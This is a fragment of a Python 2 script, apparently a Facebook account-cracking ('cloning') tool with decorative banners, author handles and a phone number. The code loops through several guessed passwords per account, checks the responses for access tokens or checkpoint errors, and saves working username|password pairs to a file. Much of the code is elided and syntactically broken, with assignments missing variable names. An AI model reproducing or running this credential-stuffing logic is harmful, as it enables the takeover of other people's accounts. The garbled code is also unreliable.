...
logo = """ ▄︻┻═┳一 ЩєLc๏Mє ┼๏ ┼ђє Fąş┼єş┼ єVєr cL๏ЙIЙG
           ▄︻┻═┳一 ♥️miscreation  oFFIcIąL♥️sexy queen ayesha----------🔴
           ▄︻┻═┳一 ♥️♥️ Queen-Cracker - cL๏Йєr  ♥️♥️----🔴🔴
           ▄︻┻═┳一    💪💪PAPPU-BACHi/lovely-queen💪💪   🔴🔴
           ▄︻┻═┳一 ---- FєєL ┼ђє P๏Щєr   --------🔴🔴
 ...
 🇹🇪🇨🇭🇳🇮🇨🇦🇱 🇶🇺🇪🇪🇳            
      ...
      ♥️♥️ fast cloning┼๏ єVєrY ß๏đY  ♥️♥️
\033[1;91m=======================================
\033[1;96mAuthor  \033[1;93m: \033[1;92mAyesha-Queen
\033[1;96mInstagram \033[1;93m: \033[1: TECHNICAL-KURI
\033[1;96mFacebook  \033[1;93m: \033[1: bareera.laiba.77
\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/abicreation/ayesha
\033[1;91m======================================="""
...
print  """\033[1;91m
     ...
     T̒͘e͑͌̔c͋͒̕ḧ́͘̚n̽̾̚i̓̓̽c͊͝a͛̈́̐l͊͒͊ Q̽͑͝u͑͐͝e̿͠e̒͐͆ń͊̚
                        Queen
                     ▇◤▔▔▔▔▔▔▔◥▇
                     ▇▏◥▇◣┊◢▇◤▕▇
                     ▇▏▃▆▅▎▅▆▃▕▇
                     ...
                     ▇▇▇▇◣▇◢▇▇▇▇
                   WhatsApp : 0014406281533
\033[1;96mAuthor  \033[1;93m: \033[1;92mTECHNICAL QUEEN
\033[1;96mInstagram \033[1;93m: \033[1;92mTECNICAL-KURI
\033[1;96mFacebook  \033[1;93m: \033[1;92m bareera.laiba.77
\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/abicreation/Ayesha
\033[1;91m======================================="""
print " \x1b[1;93m============================================================="
	...
	try:
		...
		if 'save-device' in url:
			try:
				...
				os.system('xdg-open https://www.Facebook.com/bareera.laiba.77')
...
def pilih_super():
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
					 = open("out/Successful.txt", "a")
					.write(user+"|"+pass1+"\n")
					.close()
					.append(user+pass1)
				else:
					...
					if 'access_token' in q:
						...
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;96m[\x1b[1;93mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
							 = open("out/Successful.txt", "a")
							.write(user+"|"+pass2+"\n")
							.close()
							.append(user+pass2)
							...
							if 'access_token' in q:
								...
								if 'www.facebook.com' in q["error_msg"]:
									...
									if 'access_token' in q:
										...
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96m[\x1b[1;93mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
											 = open("out/Successful.txt", "a")
											ok.write(user+"|"+pass4+"\n")
											.close()
											.append(user+pass4)
											...
											if 'access_token' in q:
												...
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96m[\x1b[1;93mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
													 = open("out/Successful.txt", "a")
													.write(user+"|"+pass5+"\n")
													cek.close()
													.append(user+pass5)
													...
													if 'access_token' in q:
														...
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
															 = open("out/Successful.txt", "a")
															.write(user+"|"+pass6+"\n")
															.close()
															.append(user+pass6)
															...
															if 'access_token' in q:
																...
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;96m[\x1b[1;93mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
																	 = open("out/Successful.txt", "a")
																	.write(user+"|"+pass7+"\n")
																	.close()
																	.append(user+pass7)
	...
	p.map(main, id)
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed AYESHA TRICKER Queen says Thank You♥️ \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(Successful))
	print("\033[1;96m[+] \033[1;92mTHANKS FOR USING MY COMMANDS ! WE WILL BE RIGHT BACK \033[1;91m: \033[1;97mout/Successful.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
